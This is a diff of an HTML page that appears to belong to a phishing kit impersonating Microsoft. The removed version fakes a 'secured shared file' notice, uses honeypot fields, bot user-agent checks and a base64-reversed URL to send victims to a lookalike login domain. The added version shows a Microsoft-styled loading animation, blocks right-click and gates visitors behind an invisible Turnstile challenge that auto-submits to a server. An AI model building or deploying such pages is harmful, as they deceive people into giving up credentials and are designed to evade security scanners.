@@ -1,255 +1,276 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Microsoft Secured Shared File</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  
+  <!-- Cloudflare Turnstile Script -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
+  
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: #f5f5f5;
+    }
 
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
-    <style>
-        body {
-            background-color: #F3F2F1;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
-        .logo-container {
-            position: absolute;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #4a4a4a;
-        }
-        .logo-container img {
-            width: 24px;
-            height: auto;
-        }
-        .logo-container .logo-text {
-            font-size: 22px;
-            margin-left: 5px;
-            font-weight: bold;
-        }
-        #box {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            text-align: center;
-            background-color: #fff;
-            padding: 40px;
-            transform: translate(-50%, -50%);
-            border-radius: 16px;
-            box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
-        }
-        .message {
-            text-align: center;
-            font-size: 24px;
-        }
-        .download {
-            text-align: center;
-            margin-top: 20px;
-        }
-        .spinner {
-            display: none;
-            margin: 20px auto;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #0078d4;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .honeypot {
-            display: none;
-        }
-        .footer {
-            position: fixed;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            color: #4a4a4a;
-            font-size: 14px;
-        }
-        .footer a {
-            color: #0078d4;
-            text-decoration: none;
-        }
-        .error-message {
-            color: red;
-            display: none;
-            margin-top: 10px;
-        }
-    </style>
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* --- Microsoft Envelope Animation CSS --- */
+    #subcontainer {
+      width: 180px;
+      height: 180px;
+      animation: bounce 5s infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes bounce {
+      0%, 100%, 12.5%, 32.5%, 76.1% { transform: translateY(0); }
+      22.5%, 86% { transform: translateY(7px); }
+    }
+
+    #logo {
+      height: 179px;
+      width: 130px;
+      overflow: hidden;
+      margin-top: -59px;
+      margin-left: 25px;
+    }
+
+    #containerShadow {
+      position: relative;
+      top: 120px;
+      left: 25px;
+      width: 130px;
+      height: 71px;
+      border-radius: 0 0 7px 7px;
+      box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
+      animation: shadow-fade 5s infinite;
+    }
+
+    @keyframes shadow-fade {
+      0%, 100%, 21.2%, 80% { opacity: 0; }
+      47%, 70% { opacity: 1; }
+    }
+
+    #flapContainer {
+      width: 130px;
+      margin-top: 179px;
+    }
+
+    #ef {
+      width: 130px;
+      height: 71px;
+      border-radius: 0 0 7px 7px;
+      overflow: hidden;
+      margin-top: -41px;
+    }
+
+    #ef > .l {
+      width: 287px;
+      height: 71px;
+      background: #28a8ea;
+      transform: translate(-153px, -70px) rotate(28deg);
+    }
+
+    #ef > .r {
+      width: 287px;
+      height: 71px;
+      background: #1490df;
+      transform: translate(-120px, 63px) rotate(-28deg);
+    }
+
+    #eb {
+      width: 130px;
+      height: 40px;
+      background: #123b6d;
+      margin-top: -70px;
+    }
+
+    #cal {
+      display: flex;
+      flex-wrap: wrap;
+      width: 118px;
+      height: 131px;
+      border-radius: 7px;
+      overflow: hidden;
+      margin: 0 auto;
+      margin-top: -306px;
+      animation: cal-bounce 5s infinite;
+      animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
+      transform: translateY(calc(131px + 20px)) scaleY(1);
+    }
+
+    @keyframes cal-bounce {
+      0%, 100%, 16.5%, 76.1% { transform: translateY(calc(131px + 20px)) scaleY(1); }
+      28% { transform: translateY(calc(131px - 92px)) scaleY(1); }
+      31% { transform: translateY(calc(131px - 80px)) scaleY(1.05); }
+      33% { transform: translateY(calc(131px - 80px)) scaleY(0.96); }
+      34%, 68.5% { transform: translateY(calc(131px - 80px)) scaleY(1); }
+      68.5% { animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29); }
+    }
+
+    #cal > .t {
+      width: 118px;
+      height: 21px;
+      margin-bottom: -1px;
+      background: #0358a7;
+    }
+
+    #cal > .r {
+      display: flex;
+      width: 118px;
+      height: 37px;
+    }
+
+    .s { width: 39.3px; height: 38px; }
+    .s1 { background: #0078d4; }
+    .s2 { background: #28a8ea; }
+    .s3 { background: #50d9ff; }
+    .s4 { background: #0364b8; }
+    .s5 { background: #14447d; }
+
+    #openedFlap {
+      width: 130px;
+      height: 107px;
+      animation: opened-flap-swing 5s infinite;
+      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+      transform-origin: top;
+      transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
+    }
+
+    @keyframes opened-flap-swing {
+      0%, 100%, 14.5%, 76% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
+      16.5%, 74% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
+    }
+
+    #closedFlap {
+      width: 130px;
+      animation: closed-flap-swing 5s infinite;
+      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
+      transform-origin: top;
+      transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 90deg);
+    }
+
+    @keyframes closed-flap-swing {
+      0%, 100%, 77%, 8.5% { transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 0); }
+      14.5%, 76% { transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 90deg); }
+    }
+
+    #fmask {
+      width: 130px;
+      height: 107px;
+      overflow: hidden;
+    }
+
+    .flapTriangle {
+      width: 96px;
+      height: 96px;
+      background: #50d9ff;
+      margin: -48px auto 0 auto;
+      border-radius: 7px;
+      transform: scaleY(0.6) rotate(45deg);
+    }
+
+    #openedFlap .flapTriangle { background: #123b6d; }
+    #closedFlap .flapTriangle { background: #50d9ff; }
+    /* --- End Envelope Animation CSS --- */
+
+    #dp {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #333;
+      height: 24px;
+    }
+
+    /* The Turnstile widget is hidden initially, but will appear if interaction is needed */
+    #cf-turnstile {
+      margin: 10px 0;
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    #MSLogo {
+      display: block;
+      margin: 20px auto 0;
+      width: 120px;
+    }
+  </style>
 </head>
+
 <body>
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
-        <div class="logo-text">Microsoft</div>
-    </div>
-    <div id="box">
-        <div class="message">
-            <p><strong>Amelia Wesley</strong><br/>Shared a secured file with you.</p>
+  <div class="container">
+    <!-- Animated Logo -->
+    <div id="loadingLogo">
+      <div id="subcontainer">
+        <div id="containerShadow"></div>
+        <div id="logo">
+          <div id="flapContainer">
+            <div id="openedFlap"><div id="fmask"><div class="flapTriangle"></div></div></div>
+            <div id="cal"><div class="t"></div><div class="r"><div class="s s1"></div><div class="s s2"></div><div class="s s3"></div></div><div class="r"><div class="s s4"></div><div class="s s1"></div><div class="s s2"></div></div><div class="r"><div class="s s5"></div><div class="s s4"></div><div class="s s1"></div></div></div>
+          </div>
+          <div id="eb"></div>
+          <div id="ef"><div class="r"></div><div class="l"></div></div>
+          <div id="closedFlap"><div id="fmask"><div class="flapTriangle"></div></div></div>
         </div>
-        <div class="download">
-            <form id="downloadForm">
-                <!-- Honeypot fields will be added dynamically -->
-                <button type="button" id="downloadButton" class="btn btn-primary btn-lg" disabled>View <strong>project_details.pdf</strong></button>
-            </form>
-            <div id="spinner" class="spinner"></div>
-            <div id="errorMessage" class="error-message">Please enable JavaScript and interact with the page to proceed.</div>
-        </div>
-    </div>
-    <div class="footer">
-        <a href="https://www.microsoft.com/en-us/legal/privacy-statement">Privacy Statement</a>
+      </div>
     </div>
 
-    <script>
-        // Anti-bot detection variables
-        let isHuman = false;
-        let interactionCount = 0;
-        let lastMousePosition = { x: 0, y: 0 };
-        let mouseMoveDistance = 0;
-        const honeypotNames = [
-            'field_' + Math.random().toString(36).substring(7),
-            'input_' + Math.random().toString(36).substring(7)
-        ];
+    <!-- Loading Messages -->
+    <div id="dp"></div>
 
-        // Dynamically create multiple honeypot inputs
-        honeypotNames.forEach(name => {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.name = name;
-            input.className = 'honeypot';
-            input.value = '';
-            document.getElementById('downloadForm').appendChild(input);
-        });
+    <!-- The form submits to the server automatically -->
+    <form action="/verify" method="POST" id="verifyForm">
+      <div id="cf-turnstile"></div>
+    </form>
+    
+    <!-- Microsoft Logo at the bottom -->
+    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft">
+  </div>
 
-        // Obfuscated URL (correct for https://login.maxsldfc.cloud/view/project-details.pdf)
-        const obfuscatedUrl = 'ZmRwLnN0YWxpZWQtdGNlam9ycC93ZWl2L2R1b2xjLmNmZGx4c2FtLm5pZ29sLy86c3B0dGg9PQ==';
+  <script>
+    // Disable Right-Click
+    document.addEventListener('contextmenu', event => event.preventDefault());
 
-        // Function to deobfuscate the URL
-        function deobfuscateUrl(obfuscated) {
-            try {
-                let decoded = atob(obfuscated);
-                let unscrambled = '';
-                for (let i = decoded.length - 1; i >= 0; i--) {
-                    unscrambled += decoded[i];
-                }
-                const url = unscrambled.substring(0, unscrambled.indexOf('=='));
-                console.log('Deobfuscated URL:', url);
-                if (!url.startsWith('https://')) {
-                    throw new Error('Invalid URL format');
-                }
-                return url;
-            } catch (e) {
-                console.error('Deobfuscation error:', e);
-                throw new Error('Failed to process URL');
-            }
-        }
+    // Cycle loading messages
+    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
+    let index = 0;
+    const dpElement = document.getElementById("dp");
+    function cycleMessages() { dpElement.textContent = messages[index]; index = (index + 1) % messages.length; }
+    cycleMessages(); 
+    setInterval(cycleMessages, 2000); // Changed to 2 seconds to feel faster
 
-        // Interaction detection
-        function enableButton(event) {
-            if (event.type === 'mousemove') {
-                const x = event.clientX;
-                const y = event.clientY;
-                if (lastMousePosition.x !== 0 || lastMousePosition.y !== 0) {
-                    mouseMoveDistance += Math.sqrt(
-                        Math.pow(x - lastMousePosition.x, 2) + Math.pow(y - lastMousePosition.y, 2)
-                    );
-                }
-                lastMousePosition = { x, y };
-            }
-            interactionCount++;
-            console.log('Interaction count:', interactionCount, 'Mouse distance:', mouseMoveDistance);
-            if (interactionCount >= 2 && mouseMoveDistance > 200) {
-                isHuman = true;
-                document.getElementById('downloadButton').disabled = false;
-                document.getElementById('errorMessage').style.display = 'none';
-                console.log('Button enabled');
-            }
-        }
+    // Automatically submit the form when CAPTCHA is solved
+    function turnstileCallback(token) {
+      document.getElementById("verifyForm").submit();
+    }
 
-        // Detect user interactions
-        document.addEventListener('mousemove', enableButton);
-        document.addEventListener('touchstart', enableButton);
-        document.addEventListener('keydown', enableButton);
-
-        // Timing check
-        let startTime = Date.now();
-        function checkTiming() {
-            const elapsedTime = Date.now() - startTime;
-            if (elapsedTime < 500) {
-                console.log('Timing check failed:', elapsedTime);
-                return false;
-            }
-            return true;
-        }
-
-        // Handle button click
-        document.getElementById('downloadButton').addEventListener('click', function() {
-            console.log('Button clicked');
-            for (let name of honeypotNames) {
-                if (document.querySelector(`input[name="${name}"]`).value !== '') {
-                    document.getElementById('errorMessage').textContent = 'Invalid request. Please try again later.';
-                    document.getElementById('errorMessage').style.display = 'block';
-                    console.log('Honeypot triggered:', name);
-                    return;
-                }
-            }
-
-            if (!isHuman) {
-                document.getElementById('errorMessage').style.display = 'block';
-                console.log('Not human');
-                return;
-            }
-
-            if (!checkTiming()) {
-                document.getElementById('errorMessage').textContent = 'Interaction too fast. Please try again.';
-                document.getElementById('errorMessage').style.display = 'block';
-                console.log('Timing check failed');
-                return;
-            }
-
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('downloadButton').disabled = true;
-
-            try {
-                const url = deobfuscateUrl(obfuscatedUrl);
-                console.log('Attempting redirect to:', url);
-                window.location.assign(url);
-                // Fallback redirect
-                window.location.href = url;
-            } catch (error) {
-                document.getElementById('errorMessage').textContent = error.message || 'Redirect failed. Please try again.';
-                document.getElementById('errorMessage').style.display = 'block';
-                document.getElementById('spinner').style.display = 'none';
-                document.getElementById('downloadButton').disabled = false;
-                console.error('Redirect error:', error);
-            }
-        });
-
-        // Bot detection
-        const userAgent = navigator.userAgent.toLowerCase();
-        const botPatterns = ['bot', 'crawl', 'spider', 'googlebot', 'bingbot', 'slurp', 'headless'];
-        const isBot = botPatterns.some(pattern => userAgent.includes(pattern)) ||
-                      !('ontouchstart' in window) && !('onmousemove' in window);
-        if (isBot) {
-            document.getElementById('errorMessage').textContent = 'Access denied.';
-            document.getElementById('errorMessage').style.display = 'block';
-            document.getElementById('downloadButton').disabled = true;
-            console.log('Bot detected:', userAgent);
-        }
-    </script>
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+    // Load Turnstile in Invisible Mode
+    function onTurnstileLoad() {
+      turnstile.render("#cf-turnstile", {
+        sitekey: "0x4AAAAAAD1A5eW6o0hhUZQm", // Your Sitekey
+        theme: "light",
+        callback: turnstileCallback,
+        appearance: "interaction-only" // <--- THIS MAKES IT AUTO
+      });
+    }
+  </script>
 </body>
 </html>
